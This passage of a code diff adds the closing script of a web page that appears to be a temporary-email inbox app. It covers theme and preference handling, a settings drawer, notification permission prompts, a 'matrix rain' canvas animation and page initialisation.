+  const full = h.length === 3 ? h.split('').map(c=>c+c).join('') : h;
+  return {
+    r: parseInt(full.substring(0,2),16),
+    g: parseInt(full.substring(2,4),16),
+    b: parseInt(full.substring(4,6),16)
+  };
+}
+function rgbToHex({r,g,b}) {
+  const to = (v) => Math.max(0, Math.min(255, Math.round(v))).toString(16).padStart(2,'0');
+  return '#' + to(r) + to(g) + to(b);
+}
+function shade(hex, pct) {
+  const c = hexToRgb(hex); const f = pct / 100;
+  return rgbToHex({
+    r: c.r + (c.r * f), g: c.g + (c.g * f), b: c.b + (c.b * f)
+  });
+}
+function tint(hex, pct) {
+  const c = hexToRgb(hex); const f = pct / 100;
+  return rgbToHex({
+    r: c.r + (255 - c.r) * f,
+    g: c.g + (255 - c.g) * f,
+    b: c.b + (255 - c.b) * f
+  });
+}
+
+function applyPrefs() {
+  const root = document.documentElement;
+  const accent = prefs.color;
+  const rgb = hexToRgb(accent);
+
+  root.style.setProperty('--accent', accent);
+  root.style.setProperty('--accent-2', shade(accent, -18));
+  root.style.setProperty('--accent-3', shade(accent, -45));
+  root.style.setProperty('--accent-4', tint(accent, 40));
+  root.style.setProperty('--accent-50', `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.12)`);
+  root.style.setProperty('--accent-100', `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.22)`);
+  root.style.setProperty('--border', `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.25)`);
+  root.style.setProperty('--font-size', prefs.fontSize + 'px');
+  root.style.setProperty('--radius', prefs.radius + 'px');
+  root.style.setProperty('--shadow-intensity', prefs.shadow);
+
+  let effectiveMode = prefs.mode;
+  if (effectiveMode === 'system') {
+    effectiveMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  }
+  document.body.dataset.theme = effectiveMode;
+
+  document.body.classList.toggle('compact', !!prefs.compact);
+  document.body.classList.toggle('no-anim', !prefs.animations);
+  document.body.classList.toggle('no-3d', !prefs.use3d);
+  document.body.classList.toggle('no-bgdeco', !prefs.bgDeco);
+  document.body.classList.toggle('btn-flat', prefs.btnStyle === 'flat');
+
+  document.querySelectorAll('.card').forEach(card => {
+    if (prefs.cardStyle === 'solid') {
+      card.style.background = '#08120B';
+      card.style.backdropFilter = '';
+      card.style.borderStyle = 'solid';
+    } else if (prefs.cardStyle === 'outline') {
+      card.style.background = 'rgba(4, 10, 6, 0.55)';
+      card.style.backdropFilter = '';
+      card.style.borderStyle = 'dashed';
+    } else {
+      card.style.background = 'rgba(8, 18, 11, 0.84)';
+      card.style.backdropFilter = 'blur(12px)';
+      card.style.borderStyle = 'solid';
+    }
+  });
+
+  const meta = document.querySelector('meta[name="theme-color"]');
+  if (meta) meta.setAttribute('content', accent);
+
+  syncDrawerControls();
+  if (typeof FallFx !== 'undefined') FallFx.readColors();
+}
+
+function syncDrawerControls() {
+  document.querySelectorAll('#swatches .swatch[data-color]').forEach(s => {
+    s.classList.toggle('active', s.dataset.color.toLowerCase() === prefs.color.toLowerCase());
+  });
+  document.querySelectorAll('#themeMode button').forEach(b => b.classList.toggle('active', b.dataset.mode === prefs.mode));
+  document.querySelectorAll('#bgGradient button').forEach(b => b.classList.toggle('active', b.dataset.grad === prefs.gradient));
+  document.querySelectorAll('#cardStyle button').forEach(b => b.classList.toggle('active', b.dataset.style === prefs.cardStyle));
+  document.querySelectorAll('#btnStyle button').forEach(b => b.classList.toggle('active', b.dataset.bstyle === prefs.btnStyle));
+  const sr = $('#shadowRange'); if (sr) { sr.value = prefs.shadow; $('#shadowVal').textContent = Number(prefs.shadow).toFixed(1); }
+  const rr = $('#radiusRange'); if (rr) { rr.value = prefs.radius; $('#radiusVal').textContent = prefs.radius; }
+  const fr = $('#fontRange'); if (fr) { fr.value = prefs.fontSize; $('#fontVal').textContent = prefs.fontSize; }
+  setSwitch('#swCompact', prefs.compact);
+  setSwitch('#swAnimations', prefs.animations);
+  setSwitch('#sw3d', prefs.use3d);
+  setSwitch('#swBgDeco', prefs.bgDeco);
+  setSwitch('#swFall', prefs.fall);
+  setSwitch('#swPreview', prefs.showPreview);
+  setSwitch('#swAutoRefresh', prefs.autoRefresh);
+  setSwitch('#swNotifications', prefs.notifications);
+  setSwitch('#swConfirmNew', prefs.confirmNew);
+  setSwitch('#swConfirmDelete', prefs.confirmDelete);
+  const dts = $('#defaultTimerSelect'); if (dts) dts.value = String(prefs.defaultTimer);
+  const ris = $('#refreshIntervalSelect'); if (ris) ris.value = String(prefs.refreshInterval);
+}
+
+function setSwitch(sel, on) {
+  const el = $(sel);
+  if (el) el.classList.toggle('on', !!on);
+}
+
+function openDrawer() {
+  drawer.classList.add('open');
+  drawerBackdrop.classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+function closeDrawer() {
+  drawer.classList.remove('open');
+  drawerBackdrop.classList.remove('open');
+  document.body.style.overflow = '';
+}
+menuBtn.addEventListener('click', openDrawer);
+closeDrawerBtn.addEventListener('click', closeDrawer);
+drawerBackdrop.addEventListener('click', closeDrawer);
+
+document.querySelectorAll('#swatches .swatch[data-color]').forEach(sw => {
+  sw.addEventListener('click', () => {
+    prefs.color = sw.dataset.color;
+    $('#customColor').value = prefs.color;
+    savePrefs(); applyPrefs();
+  });
+});
+$('#customColor').addEventListener('input', (e) => {
+  prefs.color = e.target.value;
+  savePrefs(); applyPrefs();
+});
+document.querySelectorAll('#themeMode button').forEach(b => {
+  b.addEventListener('click', () => { prefs.mode = b.dataset.mode; savePrefs(); applyPrefs(); });
+});
+document.querySelectorAll('#bgGradient button').forEach(b => {
+  b.addEventListener('click', () => { prefs.gradient = b.dataset.grad; savePrefs(); applyPrefs(); });
+});
+document.querySelectorAll('#cardStyle button').forEach(b => {
+  b.addEventListener('click', () => { prefs.cardStyle = b.dataset.style; savePrefs(); applyPrefs(); });
+});
+document.querySelectorAll('#btnStyle button').forEach(b => {
+  b.addEventListener('click', () => { prefs.btnStyle = b.dataset.bstyle; savePrefs(); applyPrefs(); });
+});
+$('#shadowRange').addEventListener('input', (e) => {
+  prefs.shadow = parseFloat(e.target.value); $('#shadowVal').textContent = prefs.shadow.toFixed(1);
+  savePrefs(); applyPrefs();
+});
+$('#radiusRange').addEventListener('input', (e) => {
+  prefs.radius = parseInt(e.target.value, 10); $('#radiusVal').textContent = prefs.radius;
+  savePrefs(); applyPrefs();
+});
+$('#fontRange').addEventListener('input', (e) => {
+  prefs.fontSize = parseInt(e.target.value, 10); $('#fontVal').textContent = prefs.fontSize;
+  savePrefs(); applyPrefs();
+});
+$('#defaultTimerSelect').addEventListener('change', (e) => {
+  prefs.defaultTimer = parseInt(e.target.value, 10);
+  savePrefs();
+  timerSelect.value = String(prefs.defaultTimer);
+  showToast('Default timer saved.', 'success');
+});
+$('#refreshIntervalSelect').addEventListener('change', (e) => {
+  prefs.refreshInterval = parseInt(e.target.value, 10);
+  savePrefs();
+  if (state.sessionActive) startAutoRefresh();
+  showToast('Refresh interval saved.', 'success');
+});
+
+function bindSwitch(sel, key, onChange) {
+  const el = $(sel);
+  if (!el) return;
+  el.addEventListener('click', async () => {
+    const next = !prefs[key];
+    if (key === 'notifications' && next) {
+      if (!('Notification' in window)) { showToast('Notifications not supported in this browser.', 'error'); return; }
+      if (Notification.permission === 'default') {
+        const perm = await Notification.requestPermission();
+        if (perm !== 'granted') { showToast('Notification permission denied.', 'error'); return; }
+      } else if (Notification.permission === 'denied') {
+        showToast('Notifications are blocked in browser settings.', 'error'); return;
+      }
+    }
+    prefs[key] = next;
+    savePrefs(); applyPrefs();
+    if (onChange) onChange(next);
+  });
+}
+bindSwitch('#swCompact', 'compact');
+bindSwitch('#swAnimations', 'animations');
+bindSwitch('#sw3d', 'use3d');
+bindSwitch('#swBgDeco', 'bgDeco');
+bindSwitch('#swFall', 'fall');
+bindSwitch('#swPreview', 'showPreview', () => renderInbox());
+bindSwitch('#swAutoRefresh', 'autoRefresh', (on) => {
+  if (on && state.sessionActive && API.enabled) startAutoRefresh(); else stopAutoRefresh();
+});
+bindSwitch('#swNotifications', 'notifications');
+bindSwitch('#swConfirmNew', 'confirmNew');
+bindSwitch('#swConfirmDelete', 'confirmDelete');
+
+$('#clearPrefsBtn').addEventListener('click', async () => {
+  const ok = await askConfirm('Clear saved preferences?', 'Your theme and interface settings will reset to defaults.', 'Clear');
+  if (!ok) return;
+  try { localStorage.removeItem(PREF_KEY); } catch (_) {}
+  prefs = { ...defaultPrefs };
+  applyPrefs();
+  showToast('Preferences cleared.', 'success');
+});
+$('#clearInboxBtn').addEventListener('click', async () => {
+  const ok = await askConfirm('Clear cached inbox?', 'Only the in-page message list will be cleared.', 'Clear');
+  if (!ok) return;
+  state.messages = [];
+  renderInbox();
+  showToast('Inbox cleared.', 'success');
+});
+
+/* ============================================================
+   MATRIX RAIN EFFECT
+   ============================================================ */
+const FallFx = (() => {
+  const cv = document.getElementById('fallFx');
+  const ctx = cv.getContext('2d');
+  const reduce = window.matchMedia('(prefers-reduced-motion: reduce)');
+  const chars = '0123456789ABCDEF@#$%&*<>?アイウエオカキクケコサシスセソタチツテトナニヌネノ';
+  let W = 0, H = 0, dpr = 1, drops = [], last = 0;
+  const fontSize = 15;
+  let activeColor = '#00FF41';
+
+  const isOn = () => prefs.fall !== false && prefs.animations !== false && !reduce.matches;
+
+  function readColors() {
+    const cs = getComputedStyle(document.documentElement);
+    activeColor = cs.getPropertyValue('--accent').trim() || '#00FF41';
+  }
+
+  function resize() {
+    dpr = Math.min(window.devicePixelRatio || 1, 2);
+    W = window.innerWidth; H = window.innerHeight;
+    cv.width = W * dpr; cv.height = H * dpr;
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    const cols = Math.floor(W / fontSize);
+    drops = Array.from({ length: cols }, () => Math.random() * (H / fontSize));
+  }
+
+  function tick(now) {
+    requestAnimationFrame(tick);
+    if (document.hidden) { last = now; return; }
+    if (!isOn()) { ctx.clearRect(0, 0, W, H); last = now; return; }
+
+    const dt = Math.min((now - (last || now)) / 16.67, 2.5);
+    last = now;
+
+    ctx.fillStyle = 'rgba(2, 5, 3, 0.08)';
+    ctx.fillRect(0, 0, W, H);
+
+    ctx.font = `bold ${fontSize}px ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace`;
+    for (let i = 0; i < drops.length; i++) {
+      const ch = chars[Math.floor(Math.random() * chars.length)];
+      const x = i * fontSize;
+      const y = drops[i] * fontSize;
+
+      ctx.fillStyle = activeColor;
+      ctx.globalAlpha = 0.42;
+      ctx.fillText(ch, x, y);
+
+      if (y > H && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i] += 0.55 * dt;
+    }
+    ctx.globalAlpha = 1;
+  }
+
+  window.addEventListener('resize', resize);
+  resize();
+  readColors();
+  requestAnimationFrame(tick);
+
+  return { readColors };
+})();
+
+/* ============================================================
+   INIT
+   ============================================================ */
+function init() {
+  MusicEngine.ensureSource();
+  applyPrefs();
+  setEmailDisplay(null);
+  renderInbox();
+  timerSelect.value = String(prefs.defaultTimer);
+  startTimer(prefs.defaultTimer);
+
+  window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', () => {
+    if (prefs.mode === 'system') applyPrefs();
+  });
+
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && state.sessionActive && state.timerRemaining > 0 && !state.timerIntervalId) {
+      state.timerIntervalId = setInterval(() => {
+        state.timerRemaining--;
+        updateTimerUI();
+        if (state.timerRemaining <= 0) { stopTimer(); showToast('Local timer ended.', 'info'); }
+      }, 1000);
+    }
+  });
+}
+init();
+</script>
+</body>
+</html>
